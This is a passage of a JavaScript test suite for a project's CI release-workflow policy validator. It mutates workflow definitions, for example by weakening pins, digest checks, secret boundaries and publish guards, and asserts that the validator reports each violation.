      const decoy = structuredClone(proofStep(workflow));
      proofStep(workflow).run = "Write-Output skipped";
      decoy.name = "Decoy ready_command proof";
      windowsManifestJob(workflow).steps.push(decoy);
    }],
  ];

  for (const [name, mutate, expectedReason = /Windows manifest proof/u] of mutations) {
    await t.test(name, () => {
      const candidate = windowsManifestWorkflow();
      mutate(candidate);
      const violations = windowsManifestProofPolicyViolations(candidate);
      assert.notDeepEqual(violations, []);
      assert.match(violations.join("\n"), expectedReason);
      const workflows = loadWorkflows();
      workflows.set(retrievalFile, candidate);
      assert.match(
        validateWorkflows(workflows).join("\n"),
        expectedReason,
      );
    });
  }
});

test("Windows source package builds pin Ninja and bind native tool identity", async (t) => {
  assert.deepEqual(validateWorkflows(loadWorkflows()), []);

  const packagedFile = "packaged-platform-proof.yml";
  const protectedFile = "windows-vulkan-proof.yml";
  const packagedIdentity = workflow => draftStep(
    workflow.jobs.build,
    "Capture reusable build cache contract",
  );
  const packagedCacheSetup = workflow => draftStep(
    workflow.jobs.build,
    "Configure bounded compiler cache",
  );
  const packagedBuild = workflow => draftStep(workflow.jobs.build, "Build codestory-cli");
  const packagedShortTarget = workflow => draftStep(
    workflow.jobs.build,
    "Configure short Windows Cargo target",
  );
  const packagedNativeStaging = workflow => draftStep(
    workflow.jobs.build,
    "Test immutable native staging on Windows",
  );
  const protectedSourceTools = workflow => draftStep(
    workflow.jobs["packaged-vulkan"],
    "Capture source build tool evidence",
  );
  const protectedHost = workflow => draftStep(
    workflow.jobs["packaged-vulkan"],
    "Capture host evidence",
  );
  const protectedPython = workflow => draftStep(
    workflow.jobs["packaged-vulkan"],
    "Install pinned Python",
  );
  const protectedBuild = workflow => draftStep(
    workflow.jobs["packaged-vulkan"],
    "Build and package native CLI",
  );

  const mutations = [
    ["packaged CMake identity removed", packagedFile, workflow => {
      packagedIdentity(workflow).run = packagedIdentity(workflow).run
        .replace('--cmake-version "$cmake_version"', "--cmake ignored");
    }, /must compute one complete reusable compiler compatibility contract/u],
    ["packaged Ninja identity removed", packagedFile, workflow => {
      packagedIdentity(workflow).run = packagedIdentity(workflow).run
        .replace('--ninja-version "$ninja_version"', "--ninja ignored");
    }, /must compute one complete reusable compiler compatibility contract/u],
    ["packaged Ninja selection removed", packagedFile, workflow => {
      packagedCacheSetup(workflow).run = packagedCacheSetup(workflow).run
        .replace(/.*CMAKE_GENERATOR=Ninja.*\n/u, "");
    }, /Configure bounded compiler cache/u],
    ["packaged short Windows target made cross-platform", packagedFile, workflow => {
      packagedShortTarget(workflow).if = "runner.os != 'Windows'";
    }, /short Cargo target must be Windows-only/u],
    ["packaged short Windows target stops using a junction", packagedFile, workflow => {
      packagedShortTarget(workflow).run = packagedShortTarget(workflow).run
        .replace("New-Item -ItemType Junction", "New-Item -ItemType Directory");
    }, /Configure short Windows Cargo target/u],
    ["packaged short Windows target stops using the runner volume root", packagedFile, workflow => {
      packagedShortTarget(workflow).run = packagedShortTarget(workflow).run
        .replace("$runnerRoot = [System.IO.Path]::GetPathRoot($workspaceTarget)", "$runnerRoot = $env:RUNNER_TEMP");
    }, /Configure short Windows Cargo target/u],
    ["packaged short Windows target points at wrong storage", packagedFile, workflow => {
      packagedShortTarget(workflow).run = packagedShortTarget(workflow).run
        .replace("-Target $workspaceTarget", '-Target "wrong"');
    }, /Configure short Windows Cargo target/u],
    ["packaged short Windows target no longer exports Cargo output", packagedFile, workflow => {
      packagedShortTarget(workflow).run = packagedShortTarget(workflow).run
        .replace("| Out-File -FilePath $env:GITHUB_ENV", "| Write-Output");
    }, /Configure short Windows Cargo target/u],
    ["packaged native staging regression made cross-platform", packagedFile, workflow => {
      packagedNativeStaging(workflow).if = "runner.os != 'Windows'";
    }, /immutable native staging regression must run on Windows/u],
    ["packaged native staging regression removed", packagedFile, workflow => {
      packagedNativeStaging(workflow).run = "cargo test --release --locked";
    }, /Test immutable native staging on Windows/u],
    ["packaged build overrides generator", packagedFile, workflow => {
      packagedBuild(workflow).env = { CMAKE_GENERATOR: "Visual Studio 18 2026" };
    }, /native package build must not override the selected generator/u],
    ["packaged Windows smoke ignores short target", packagedFile, workflow => {
      draftStep(workflow.jobs.build, "Smoke codestory-cli on Windows").run
        = '$bin = "target/codestory-cli.exe"';
    }, /Smoke codestory-cli on Windows/u],
    ["packaged Windows asset ignores short target", packagedFile, workflow => {
      draftStep(workflow.jobs.build, "Package release asset on Windows").run
        = 'python .github/scripts/package-codestory-release.py --binary "target/codestory-cli.exe"';
    }, /Package release asset on Windows/u],
    ["packaged Windows asset reroutes the short-target binary", packagedFile, workflow => {
      const step = draftStep(workflow.jobs.build, "Package release asset on Windows");
      step.run = step.run.replace("--binary $bin", "--binary target/wrong.exe");
    }, /Package release asset on Windows/u],
    ["protected generator removed", protectedFile, workflow => {
      delete protectedBuild(workflow).env.CMAKE_GENERATOR;
    }, /source package build must use the Ninja native generator/u],
    ["protected generator changed", protectedFile, workflow => {
      protectedBuild(workflow).env.CMAKE_GENERATOR = "Visual Studio 18 2026";
    }, /source package build must use the Ninja native generator/u],
    ["protected build adds a second generator surface", protectedFile, workflow => {
      protectedBuild(workflow).env.CMAKE_GENERATOR_PLATFORM = "x64";
    }, /source package build must use the Ninja native generator/u],
    ["protected host omits generator selection", protectedFile, workflow => {
      protectedSourceTools(workflow).run = protectedSourceTools(workflow).run
        .replace(/.*CMAKE_GENERATOR=Ninja.*\n/u, "");
    }, /Capture source build tool evidence/u],
    ["protected host omits CMake version", protectedFile, workflow => {
      protectedSourceTools(workflow).run = protectedSourceTools(workflow).run
        .replace(/.*cmake --version.*\n/u, "");
    }, /Capture source build tool evidence/u],
    ["protected host omits Ninja version", protectedFile, workflow => {
      protectedSourceTools(workflow).run = protectedSourceTools(workflow).run
        .replace(/.*ninja --version.*\n/u, "");
    }, /Capture source build tool evidence/u],
    ["protected source evidence made unconditional", protectedFile, workflow => {
      delete protectedSourceTools(workflow).if;
    }, /source build tool evidence must remain source-only/u],
    ["protected source evidence guard inverted", protectedFile, workflow => {
      protectedSourceTools(workflow).if = "inputs.use_packaged_cli_artifact";
    }, /source build tool evidence must remain source-only/u],
    ["protected source evidence made optional", protectedFile, workflow => {
      protectedSourceTools(workflow)["continue-on-error"] = true;
    }, /source build tool evidence must remain source-only/u],
    ["protected host requires PowerShell 7", protectedFile, workflow => {
      protectedHost(workflow).shell = "pwsh";
    }, /must use built-in Windows PowerShell/u],
    ["protected Python action drifts", protectedFile, workflow => {
      protectedPython(workflow).uses = "actions/setup-python@v6";
    }, /must use actions\/setup-python@v7\.0\.0/u],
    ["protected Python version drifts", protectedFile, workflow => {
      protectedPython(workflow).with["python-version"] = "3.14";
    }, /must pin Python 3\.13/u],
    ["protected Python process policy is removed", protectedFile, workflow => {
      delete protectedPython(workflow).env;
    }, /must pin Python 3\.13 with process-scoped script policy/u],
    ["protected Python process policy drifts", protectedFile, workflow => {
      protectedPython(workflow).env.PSExecutionPolicyPreference = "RemoteSigned";
    }, /must pin Python 3\.13 with process-scoped script policy/u],
    ["protected Python becomes conditional", protectedFile, workflow => {
      protectedPython(workflow).if = "false";
    }, /must pin Python 3\.13 with process-scoped script policy/u],
    ["protected Python becomes optional", protectedFile, workflow => {
      protectedPython(workflow)["continue-on-error"] = true;
    }, /must pin Python 3\.13 with process-scoped script policy/u],
    ["protected Python moves after host scripts", protectedFile, workflow => {
      const steps = workflow.jobs["packaged-vulkan"].steps;
      const pythonIndex = steps.findIndex(step => step.name === "Install pinned Python");
      const [python] = steps.splice(pythonIndex, 1);
      steps.push(python);
    }, /pinned Python must run immediately after checkout/u],
  ];

  for (const [name, file, mutate, expectedReason] of mutations) {
    await t.test(name, () => {
      const workflows = loadWorkflows();
      mutate(workflows.get(file));
      const violations = validateWorkflows(workflows);
      assert.notDeepEqual(violations, []);
      assert.match(violations.join("\n"), expectedReason);
    });
  }
});

test("protected candidate installs prove accelerated server behavior without CPU fallback", async (t) => {
  assert.deepEqual(validateWorkflows(loadWorkflows()), []);

  const platforms = [
    {
      file: "macos-metal-proof.yml",
      job: "packaged-metal",
      proof: "Prove candidate-installed macOS Metal runtime",
      backend: "Metal",
    },
    {
      file: "windows-vulkan-proof.yml",
      job: "packaged-vulkan",
      proof: "Prove candidate-installed Windows Vulkan runtime",
      backend: "Vulkan",
    },
    {
      file: "linux-vulkan-proof.yml",
      job: "packaged-vulkan",
      proof: "Prove candidate-installed Linux Vulkan runtime",
      backend: "Vulkan",
    },
  ];

  for (const platform of platforms) {
    const mutations = [
      ["CPU fallback enabled", step => {
        step.env.CODESTORY_EMBED_ALLOW_CPU = "1";
      }],
      ["accelerated engine policy removed", step => {
        step.run = step.run.replace("--engine-policy accelerated", "--engine-policy cpu_explicit");
      }],
      ["accelerator backend replaced by CPU", step => {
        step.run = step.run.replace(`--expected-backend ${platform.backend}`, "--expected-backend CPU");
      }],
      ["server behavior reduced to a ground-only probe", step => {
        step.run = step.run.replace("--server-behavior-only", "--ground-only");
      }],
      ["installed provenance removed", step => {
        step.run = step.run.replace("--installed-plugin-attestation", "--installed-plugin-provenance");
      }],
      ["calibration is smuggled into the standard candidate proof", step => {
        step.run += "\n--calibration-bundle forged.json";
      }],
    ];

    for (const [name, mutate] of mutations) {
      await t.test(`${platform.file}: ${name}`, () => {
        const workflows = loadWorkflows();
        const workflow = workflows.get(platform.file);
        mutate(draftStep(workflow.jobs[platform.job], platform.proof));
        const violations = validateWorkflows(workflows);
        assert.notDeepEqual(violations, []);
        assert.match(violations.join("\n"), new RegExp(
          `${platform.file.replaceAll(".", "\\.")}|${platform.proof}`,
          "u",
        ));
      });
    }
  }
});

test("protected macOS package download is resumable and container-verified", async (t) => {
  assert.deepEqual(validateWorkflows(loadWorkflows()), []);

  const file = "macos-metal-proof.yml";
  const mutations = [
    ["resume removed", step => {
      step.run = step.run.replace("--continue-at -", "--remote-name");
    }, /Download packaged CLI artifact/u],
    ["container digest bypassed", step => {
      step.run = step.run.replace(
        'test "$actual_digest" = "${expected_digest#sha256:}"',
        "true",
      );
    }, /Download packaged CLI artifact/u],
    ["producer SHA binding removed", step => {
      step.run = step.run.replace(".workflow_run.head_sha == $sha", "true");
    }, /Download packaged CLI artifact/u],
  ];

  for (const [name, mutate, expectedReason] of mutations) {
    await t.test(name, () => {
      const workflows = loadWorkflows();
      const step = draftStep(
        workflows.get(file).jobs["packaged-metal"],
        "Download packaged CLI artifact",
      );
      mutate(step);
      const violations = validateWorkflows(workflows);
      assert.notDeepEqual(violations, []);
      assert.match(violations.join("\n"), expectedReason);
    });
  }
});

test("post-publish proof uses an immutable real Codex marketplace install", async (t) => {
  assert.deepEqual(validateWorkflows(loadWorkflows()), []);

  const file = "post-publish-release-smoke.yml";
  const installStep = workflow => workflow.jobs.smoke.steps.find(
    ({ name }) => name === "Resolve the published plugin through the marketplace catalog",
  );
  const proofStep = workflow => workflow.jobs.smoke.steps.find(
    ({ name }) => name === "Prove the catalog-resolved published runtime",
  );
  const mutations = [
    ["Codex CLI pin drifts", workflow => {
      workflow.env.CODEX_CLI_VERSION = "latest";
    }, /pin the Codex CLI/u],
    ["marketplace revision becomes mutable", workflow => {
      installStep(workflow).run = installStep(workflow).run
        .replace('--marketplace-revision "$marketplace_revision"', "--marketplace-revision main");
    }, /Resolve the published plugin through the marketplace catalog/u],
    ["marketplace revision is resolved again after publication", workflow => {
      installStep(workflow).run += "\ngit ls-remote origin refs/heads/main";
    }, /must not fabricate installation with git ls-remote/u],
    ["checked-out package binding is removed", workflow => {
      installStep(workflow).run = installStep(workflow).run
        .replace(
          '--source-repository "$GITHUB_WORKSPACE"',
          '--source-commit "$GITHUB_SHA"',
        );
    }, /Resolve the published plugin through the marketplace catalog/u],
    ["real installer helper is bypassed", workflow => {
      installStep(workflow).run = installStep(workflow).run
        .replace(
          "install-codestory-marketplace-proof.mjs",
          "copy-codestory-marketplace-proof.mjs",
        );
    }, /Resolve the published plugin through the marketplace catalog/u],
    ["source archive is substituted for installation", workflow => {
      installStep(workflow).run += "\ngit archive HEAD:plugins/codestory";
    }, /must not fabricate installation with git archive/u],
    ["single v2 attestation is removed", workflow => {
      proofStep(workflow).run = proofStep(workflow).run
        .replace("--installed-plugin-attestation", "--installed-plugin-provenance");
    }, /installed runtime proof must run --installed-plugin-attestation/u],
  ];

  for (const [name, mutate, expectedReason] of mutations) {
    await t.test(name, () => {
      const workflows = loadWorkflows();
      mutate(workflows.get(file));
      const violations = validateWorkflows(workflows);
      assert.notDeepEqual(violations, []);
      assert.match(violations.join("\n"), expectedReason);
    });
  }
});

test("post-publish proof keeps every release asset on its protected accelerator", async (t) => {
  assert.deepEqual(validateWorkflows(loadWorkflows()), []);

  const file = "post-publish-release-smoke.yml";
  const proof = workflow => draftStep(
    workflow.jobs.smoke,
    "Prove the catalog-resolved published runtime",
  );
  const installStep = workflow => draftStep(
    workflow.jobs.smoke,
    "Resolve the published plugin through the marketplace catalog",
  );
  const row = (workflow, assetTarget) => {
    const match = workflow.jobs.smoke.strategy.matrix.include.find(
      ({ asset_target: candidate }) => candidate === assetTarget,
    );
    assert.ok(match, `missing ${assetTarget} post-publish row`);
    return match;
  };
  const mutations = [
    ["Windows moves to a hosted runner", workflow => {
      row(workflow, "windows-x64").runs_on = '["windows-latest"]';
    }],
    ["macOS loses its protected environment", workflow => {
      row(workflow, "macos-arm64").environment = "";
    }],
    ["Linux backend falls back to CPU", workflow => {
      row(workflow, "linux-x64").backend = "CPU";
    }],
    ["matrix starts cancelling sibling platform proof", workflow => {
      workflow.jobs.smoke.strategy["fail-fast"] = true;
    }],
    ["published runtime enables CPU fallback", workflow => {
      proof(workflow).env.CODESTORY_EMBED_ALLOW_CPU = "1";
    }],
    ["published runtime drops accelerated policy", workflow => {
      proof(workflow).run = proof(workflow).run
        .replace("--engine-policy accelerated", "--engine-policy cpu_explicit");
    }],
    ["published runtime drops bounded server behavior", workflow => {
      proof(workflow).run = proof(workflow).run
        .replace("--server-behavior-only", "--ground-only");
    }],
    ["published Python loses the protected execution policy", workflow => {
      delete draftStep(workflow.jobs.smoke, "Install pinned Python")
        .env.PSExecutionPolicyPreference;
    }],
    ["published Python proof falls back to PowerShell", workflow => {
      draftStep(workflow.jobs.smoke, "Prove packaged version, help, and stdio shape").shell
        = "powershell";
    }],
    ["published marketplace install inherits personal HOME", workflow => {
      installStep(workflow).run = installStep(workflow).run
        .replace('HOME="$isolated_home" node', "node");
    }],
    ["published macOS Python pin drifts", workflow => {
      draftStep(workflow.jobs.smoke, "Install pinned Python on macOS").run
        = draftStep(workflow.jobs.smoke, "Install pinned Python on macOS").run
          .replaceAll("3.13.14", "3.14.6");
    }],
    ["Windows installer loses the protected execution policy", workflow => {
      draftStep(workflow.jobs.smoke, "Run Windows installer ownership self-test").shell
        = "pwsh";
    }],
  ];

  for (const [name, mutate] of mutations) {
    await t.test(name, () => {
      const workflows = loadWorkflows();
      mutate(workflows.get(file));
      const violations = validateWorkflows(workflows);
      assert.notDeepEqual(violations, []);
      assert.match(violations.join("\n"), /post-publish-release-smoke\.yml/u);
    });
  }
});

test("package workflow keeps a packaging-only timeout", () => {
  const workflows = loadWorkflows();
  assert.deepEqual(validateWorkflows(workflows), []);

  workflows.get("packaged-platform-proof.yml").jobs.build["timeout-minutes"] =
    "${{ inputs.calibration_mode && 180 || (inputs.candidate_installed_proof && 120 || 60) }}";

  assert.match(
    validateWorkflows(workflows).join("\n"),
    /package build timeout must cover only calibration or signed macOS packaging/u,
  );
});

test("draft source workflow freezes its complete top-level contract", async (t) => {
  assert.deepEqual(draftWorkflowPolicyViolations(draftSourceWorkflow()), []);
  const reordered = draftSourceWorkflow();
  [reordered.on.pull_request.paths[0], reordered.on.pull_request.paths[1]]
    = [reordered.on.pull_request.paths[1], reordered.on.pull_request.paths[0]];
  assert.deepEqual(
    draftWorkflowPolicyViolations(reordered),
    [],
    "path membership is exact but order-insensitive",
  );

  const mutations = [
    ["workflow name", workflow => { workflow.name = "Draft checks"; }],
    ["missing pull request trigger", workflow => { delete workflow.on.pull_request; }],
    ["extra push trigger", workflow => { workflow.on.push = { branches: ["main"] }; }],
    ["missing path", workflow => { workflow.on.pull_request.paths.pop(); }],
    ["duplicate path", workflow => {
      workflow.on.pull_request.paths[1] = workflow.on.pull_request.paths[0];
    }],
    ["extra path", workflow => { workflow.on.pull_request.paths.push("scripts/**"); }],
    ["dispatch inputs", workflow => {
      workflow.on.workflow_dispatch = { inputs: { ref: { required: false, type: "string" } } };
    }],
    ["missing dispatch", workflow => { delete workflow.on.workflow_dispatch; }],
    ["write permission", workflow => { workflow.permissions.contents = "write"; }],
    ["extra permission", workflow => { workflow.permissions.actions = "read"; }],
    ["concurrency group", workflow => { workflow.concurrency.group = "draft-${{ github.ref }}"; }],
    ["disabled concurrency cancellation", workflow => {
      workflow.concurrency["cancel-in-progress"] = false;
    }],
    ["extra concurrency field", workflow => { workflow.concurrency.limit = 1; }],
    ["top-level env", workflow => { workflow.env = { CARGO_TERM_COLOR: "always" }; }],
    ["top-level defaults", workflow => {
      workflow.defaults = { run: { shell: "bash" } };
    }],
    ["missing jobs", workflow => { delete workflow.jobs; }],
    ["cloned job", workflow => {
      workflow.jobs["extra-draft-lane"] = structuredClone(workflow.jobs["linux-draft"]);
    }],
  ];

  for (const [name, mutate] of mutations) {
    await t.test(name, () => {
      const candidate = draftSourceWorkflow();
      mutate(candidate);
      assert.notDeepEqual(draftWorkflowPolicyViolations(candidate), []);
    });
  }
});

test("draft source job rejects every alternate execution surface", async (t) => {
  assert.deepEqual(draftSourcePolicyViolations(draftSourceJob(), retrievalSourceJob()), []);

  const mutations = [
    ["job name", job => { job.name = "Draft source"; }],
    ["runner", job => { job["runs-on"] = "ubuntu-24.04"; }],
    ["timeout", job => { job["timeout-minutes"] = 60; }],
    ["if", job => { job.if = "always()"; }],
    ["needs", job => { job.needs = ["untrusted"]; }],
    ["permissions", job => { job.permissions = { contents: "write" }; }],
    ["continue-on-error", job => { job["continue-on-error"] = true; }],
    ["strategy", job => { job.strategy = { matrix: { shard: [1, 2] } }; }],
    ["env", job => { job.env = { RUSTFLAGS: "-Awarnings" }; }],
    ["defaults", job => { job.defaults = { run: { shell: "bash" } }; }],
    ["environment", job => { job.environment = "release"; }],
    ["container", job => { job.container = "ubuntu:latest"; }],
    ["services", job => { job.services = { cache: { image: "redis" } }; }],
    ["outputs", job => { job.outputs = { result: "${{ steps.proof.outputs.result }}" }; }],
  ];

  for (const [name, mutate] of mutations) {
    await t.test(name, () => {
      const candidate = draftSourceJob();
      mutate(candidate);
      assert.notDeepEqual(draftSourcePolicyViolations(candidate, retrievalSourceJob()), []);
    });
  }
});

test("draft source steps reject checkout and proof bypass mutations", async (t) => {
  const checkout = job => job.steps[0];
  const proof = job => draftStep(job, "Prove focused publication contracts");
  const mutations = [
    ["checkout ref", job => { checkout(job).with = { ref: "refs/heads/main" }; }],
    ["checkout persisted credentials", job => {
      checkout(job).with = { "persist-credentials": true };
    }],
    ["checkout if", job => { checkout(job).if = "always()"; }],
    ["checkout continue-on-error", job => { checkout(job)["continue-on-error"] = true; }],
    ["checkout env", job => { checkout(job).env = { GH_TOKEN: "token" }; }],
    ["checkout id", job => { checkout(job).id = "checkout"; }],
    ["checkout action", job => { checkout(job).uses = "actions/checkout@v4"; }],
    ["cloned step", job => { job.steps.push(structuredClone(checkout(job))); }],
    ["deleted step", job => { job.steps.splice(5, 1); }],
    ["reordered steps", job => {
      [job.steps[5], job.steps[6]] = [job.steps[6], job.steps[5]];
    }],
    ["run step shell", job => { draftStep(job, "Check formatting").shell = "bash"; }],
    ["restore extra input", job => {
      draftStep(job, "Restore Cargo inputs and output").with["fail-on-cache-miss"] = false;
    }],
    ["save extra input", job => {
      draftStep(job, "Save Cargo inputs and output").with["restore-keys"] = "decoy";
    }],
    ["proof if", job => { proof(job).if = "always()"; }],
    ["proof continue-on-error", job => { proof(job)["continue-on-error"] = true; }],
    ["proof env", job => { proof(job).env = { RUST_BACKTRACE: "1" }; }],
    ["native staging proof removed", job => {
      proof(job).run = proof(job).run
        .split("\n")
        .filter(command => !command.includes("--test native_staging"))
        .join("\n");
    }],
    ["native staging proof reordered", job => {
      const commands = proof(job).run.trim().split("\n");
      [commands[0], commands[1]] = [commands[1], commands[0]];
      proof(job).run = commands.join("\n");
    }],
  ];

  for (const [name, mutate] of mutations) {
    await t.test(name, () => {
      const candidate = draftSourceJob();
      mutate(candidate);
      assert.notDeepEqual(draftSourcePolicyViolations(candidate, retrievalSourceJob()), []);
    });
  }
});

test("draft source workflow rejects cloned top-level jobs", () => {
  const workflows = loadWorkflows();
  const workflow = draftSourceWorkflow();
  assert.deepEqual(draftWorkflowPolicyViolations(workflow), []);

  workflow.jobs["extra-draft-lane"] = structuredClone(workflow.jobs["linux-draft"]);
  workflows.set("rust-ci.yml", workflow);
  assert.match(
    validateWorkflows(workflows).join("\n"),
    /must contain exactly the linux-draft job/u,
  );
});

test("PR package proof cannot opt into signing credentials", () => {
  const workflow = { jobs: { "packaged-proof": { with: { sign_macos: false } } } };
  assert.deepEqual(packagedPrSigningViolations(workflow), []);

  for (const mutate of [
    candidate => { candidate.jobs["packaged-proof"].with.sign_macos = true; },
    candidate => { candidate.jobs["packaged-proof"].secrets = "inherit"; },
    candidate => { candidate.jobs["packaged-proof"].environment = "macos-release-signing"; },
    candidate => { candidate.env = { APPLE_NOTARY_KEY_ID: "forbidden" }; },
  ]) {
    const candidate = structuredClone(workflow);
    mutate(candidate);
    assert.notDeepEqual(packagedPrSigningViolations(candidate), []);
  }
});

test("release approval crosses only the protected release boundary", () => {
  const boundary = releaseEvidenceApprovalBoundary();
  assert.deepEqual(releaseEvidenceApprovalViolations(boundary.callers, boundary.called), []);

  for (const mutate of [
    candidate => { candidate.callers[0][1] = undefined; },
    candidate => { candidate.callers[1][1].uses = "./.github/workflows/release.yml"; },
    candidate => { delete candidate.callers[1][1].with.source_run_id; },
    candidate => { delete candidate.callers[0][1].secrets; },
    candidate => {
      candidate.callers[0][1].secrets.CODESTORY_RELEASE_EVIDENCE_APPROVAL_JSON
        = "${{ secrets.WRONG_SECRET }}";
    },
    candidate => { candidate.callers[0][1].secrets.EXTRA_SECRET = "${{ secrets.EXTRA }}"; },
    candidate => { candidate.callers[0][1].secrets = "inherit"; },
    candidate => { candidate.callers[1][1].secrets = "inherit"; },
    candidate => { delete candidate.called.on.workflow_call.secrets; },
    candidate => {
      candidate.called.on.workflow_call.secrets
        .CODESTORY_RELEASE_EVIDENCE_APPROVAL_JSON.required = true;
    },
    candidate => { candidate.called.jobs.measure.environment = "release"; },
    candidate => {
      candidate.called.jobs.measure.steps[0].env.APPROVAL_JSON
        = "${{ inputs.CODESTORY_RELEASE_EVIDENCE_APPROVAL_JSON }}";
    },
    candidate => { candidate.called.jobs.measure.steps[0].run = "exit 1"; },
  ]) {
    const candidate = structuredClone(boundary);
    mutate(candidate);
    assert.notDeepEqual(releaseEvidenceApprovalViolations(candidate.callers, candidate.called), []);
  }
});

test("notarization must use explicit polling", () => {
  assert.deepEqual(notaryStepViolations({ run: "xcrun notarytool submit bundle.zip \\\n  --no-wait" }), []);
  assert.match(
    notaryStepViolations({ run: "xcrun notarytool submit bundle.zip \\\n  --wait" }).join("\n"),
    /poll explicitly/u,
  );
});

test("bare macOS CLI proof uses quarantine execution instead of app assessment", () => {
  const assessment = {
    run: [
      "xattr -w com.apple.quarantine quarantine codestory-cli",
      "xattr -p com.apple.quarantine codestory-cli > quarantine.txt",
      "spctl --assess --type execute --verbose=4 codestory-cli > spctl-diagnostic.txt 2>&1",
      "spctl_status=$?",
      "grep -F 'does not seem to be an app' spctl-diagnostic.txt",
    ].join("\n"),
  };
  const execution = { run: "codestory-cli --version\ncodestory-cli --help" };
  assert.deepEqual(macosCliDistributionViolations(assessment, execution, "codestory-cli"), []);

  for (const mutate of [
    candidate => { candidate.assessment.run = candidate.assessment.run.replace("xattr -w com.apple.quarantine quarantine codestory-cli", "true"); },
    candidate => { candidate.assessment.run += "\naccepted=false"; },
    candidate => { candidate.assessment.run = candidate.assessment.run.replace("spctl_status=$?", "true"); },
    candidate => { candidate.execution.run = "original-cli --version\noriginal-cli --help"; },
  ]) {
    const candidate = { assessment: structuredClone(assessment), execution: structuredClone(execution) };
    mutate(candidate);
    assert.notDeepEqual(macosCliDistributionViolations(candidate.assessment, candidate.execution, "codestory-cli"), []);
  }
});

test("controlled semantic workflow fixtures emit class-prefixed diagnostics", async (t) => {
  const fixture = JSON.parse(readFileSync(path.join(
    root,
    ".github/scripts/fixtures/workflow-policy-invalid.json",
  ), "utf8"));
  assert.deepEqual(releaseWorkflowContractViolations(loadWorkflows()), []);
  for (const fixtureCase of fixture.cases) {
    await t.test(fixtureCase.id, () => {
      const workflows = loadWorkflows();
      const workflow = workflows.get(fixtureCase.workflow);
      let target = fixtureCase.job ? workflow.jobs[fixtureCase.job] : workflow;
      if (fixtureCase.step) {
        target = target.steps.find(({ name }) => name === fixtureCase.step);
        assert.ok(target, `missing step ${fixtureCase.step}`);
      }
      const field = [...fixtureCase.field];
      const key = field.pop();
      for (const segment of field) target = target[segment];
      if (fixtureCase.op === "delete") delete target[key];
      else target[key] = structuredClone(fixtureCase.value);
      const violations = releaseWorkflowContractViolations(workflows);
      assert.ok(
        violations.some((message) => message.startsWith(fixtureCase.class_prefix)),
        violations.join("\n"),
      );
    });
  }
});

test("release policy rejects manifest producer, trusted-map, and publication bypasses", () => {
  const mutations = [
    ["call expected head", workflows => { delete workflows.get("release.yml").on.workflow_call.inputs.expected_head_sha; }],
    ["call publication default", workflows => { workflows.get("release.yml").on.workflow_call.inputs.publish_release.default = true; }],
    ["manual expected head", workflows => { workflows.get("release.yml").on.workflow_dispatch.inputs.expected_head_sha.required = false; }],
    ["manual publication authority", workflows => {
      workflows.get("release.yml").on.workflow_dispatch.inputs.publish_release = {
        required: false,
        type: "boolean",
        default: false,
      };
    }],
    ["release authority guard", workflows => {
      const step = workflows.get("release.yml").jobs.preflight.steps
        .find(({ name }) => name === "Validate release authority");
      step.run = step.run.replace("dev/codestory-next moved from proved head", "dev head changed");
    }],
    ["automatic caller event", workflows => {
      const step = workflows.get("release.yml").jobs.preflight.steps
        .find(({ name }) => name === "Validate release authority");
      step.run = step.run.replace('"$GITHUB_EVENT_NAME" != "push"', '"$GITHUB_EVENT_NAME" != "workflow_call"');
    }],
    ["accepted dev ledger revalidation", workflows => {
      workflows.get("release.yml").jobs["pre-publish-closeout"].steps = workflows
        .get("release.yml").jobs["pre-publish-closeout"].steps
        .filter(({ name }) => name !== "Revalidate proof-only dev head");
    }],
    ["publish-time main revalidation", workflows => {
      const step = workflows.get("release.yml").jobs.publish.steps
        .find(({ name }) => name === "Create GitHub release");
      step.run = step.run.replace("main moved from publishable head", "main changed");
    }],
    ["publish authority", workflows => { delete workflows.get("release.yml").jobs.publish.if; }],
    ["post-publish smoke authority", workflows => { delete workflows.get("release.yml").jobs["post-publish-smoke"].if; }],
    ["post-publish closeout authority", workflows => { delete workflows.get("release.yml").jobs["post-publish-closeout"].if; }],
    ["trusted caller opt-in", workflows => { delete workflows.get("auto-release.yml").jobs.release.with.publish_release; }],
    ["trusted caller secret handoff", workflows => { delete workflows.get("auto-release.yml").jobs.release.secrets; }],
    ["duplicate automatic policy gate", workflows => {
      workflows.get("auto-release.yml").jobs["workflow-policy"] = {
        "runs-on": "ubuntu-latest",
        steps: [],
      };
    }],
    ["duplicate automatic version validation", workflows => {
      workflows.get("auto-release.yml").jobs["detect-version"].steps.push({
        name: "Validate synchronized release version",
        run: "python .github/scripts/check-codestory-release.py --version 0.16.0",
      });
    }],
    ["manual release source permissions", workflows => { delete workflows.get("release.yml").permissions["pull-requests"]; }],
    ["automatic release source permissions", workflows => { delete workflows.get("auto-release.yml").jobs.release.permissions["pull-requests"]; }],
    ["rogue release caller", workflows => {
      workflows.get("plugin-static.yml").jobs["rogue-release"] = {
        uses: "./.github/workflows/release.yml",
      };
    }],
    ["source emission", workflows => { delete workflows.get("release.yml").jobs["source-proof"].with.emit_release_cells; }],
    ["full rerun preflight guard", workflows => {
      workflows.get("release.yml").jobs.preflight.steps = workflows
        .get("release.yml").jobs.preflight.steps
        .filter(({ name }) => name !== "Refuse existing tag or release");
    }],
    ["public marketplace preflight", workflows => {
      workflows.get("release.yml").jobs.preflight.steps = workflows
        .get("release.yml").jobs.preflight.steps
        .filter(({ name }) => name !== "Prove the public marketplace install path");
    }],
    ["post-publish marketplace revision handoff", workflows => {
      workflows.get("release.yml").jobs["post-publish-smoke"].with.marketplace_revision = "main";
    }],
    ["publish replay guard", workflows => {
      const step = workflows.get("release.yml").jobs.publish.steps
        .find(({ name }) => name === "Refuse existing tag or release");
      step.run = step.run.replaceAll("exit 1", "true");
    }],
    ["publish bypass", workflows => {
      workflows.get("release.yml").jobs.publish.needs = [
        "preflight",
        "packaged-proof",
        "macos-metal-proof",
        "windows-vulkan-proof",
      ];
    }],
    ["trusted producer map", workflows => {
      const step = workflows.get("release.yml").jobs["pre-publish-closeout"].steps
        .find(({ name }) => name === "Evaluate authenticated pre-publish closeout");
      step.run = step.run.replace("--trusted-producers", "--self-attested-producers");
    }],
    ["flattened current-run JSON", workflows => {
      const step = workflows.get("release.yml").jobs["pre-publish-closeout"].steps
        .find(({ name }) => name === "Download selected pre-publish release cells");
      delete step.with["artifact-ids"];
      step.with.pattern = "release-cell-prepublish-*";
      step.with["merge-multiple"] = true;
    }],
    ["container digest warning accepted", workflows => {
      const step = workflows.get("release.yml").jobs["pre-publish-closeout"].steps
        .find(({ name }) => name === "Verify selected pre-publish artifact container digests");
      step.run = step.run.replace(
        'test "$actual_digest" = "$expected_digest"',
